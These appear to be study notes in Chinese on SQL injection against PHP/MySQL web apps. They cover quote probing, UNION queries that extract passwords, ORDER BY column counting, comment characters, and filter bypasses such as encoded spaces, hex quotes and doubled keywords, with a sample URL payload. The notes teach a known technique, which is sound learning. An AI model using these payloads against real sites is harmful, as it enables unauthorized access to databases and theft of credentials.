# SQL 注入

### 基本查询

#### 尝试查询

1'        查询是否存在注入

1'#      使用注释符查询是否可以逃逸引号

#### 联合查询

union

```my
select user_id,first_name,user from users where user_id = 1 union select 1,2,3;
```

select 后面的字段数需要和 where 前面的字段数一致

##### 另外

```my
select user_id,first_name,user from users where user_id = 1 union select password,2,3;
```

可以通过联合查询来查询  不允许 查询的内容

### 检测字段数

#### 通过MySQL自带的排序功能

```my
1' order by 4#
```



通过修改排序的字段数来确定一共有几个字段数



## 回显payload

```my
select x,x,x
```

**select后面的查询结果可以回显，在回显的任意字段可以插入查询语句**

例如

```mysql
1' union select version() 2,3;
```

就可以查询版本

**诸如此类，既可以查询数据库，表名，密码等有关信息**



## 注释符

+ # 
+ --_(--+)     在http传输中，+  加号代表空格
+ /**/ 

### 绕过

**php在过滤空格**

php支持的编码

## 空格绕过

+ %20（空格的url编码）
+ %a0 ,  %0a  （回车的url编码，可以代替空格绕过）
+ ()    用括号来空格绕过   select(1),并非select()1
+ /**/       eg:  select/⭐⭐/1

**引号绕过**

+ 用16进制替换引号
+ %27    （单引号的url编码）

### 双写绕过

在注入时，php会将某些语句办掉，比方说把admin或者or办掉

这时

**admin => ''**

ad**admin**min => 'admin'        双写就可以绕过被办掉的语句

**ps:   如果or被办了，那在输入information时，其中的or也得双写。**

属实女少口阿

**此时，可以检测相关语句是否被办**

http://xxxxxxx/xx.php?id=1' a**and**nd 0=(length('union')=5) --+

**length('union')=5    其中，length函数为获取字符串的长度，**

**显而易见，union的长度为5，但是如果sql注入时union被办掉了，union的字符串长度则为零**

**那length('union')则等于0**

**length('union')=5  不成立，  返回值为0**

**则0=(length('union')=5)  则成立**

**即达到检测语句是否被办的效果**

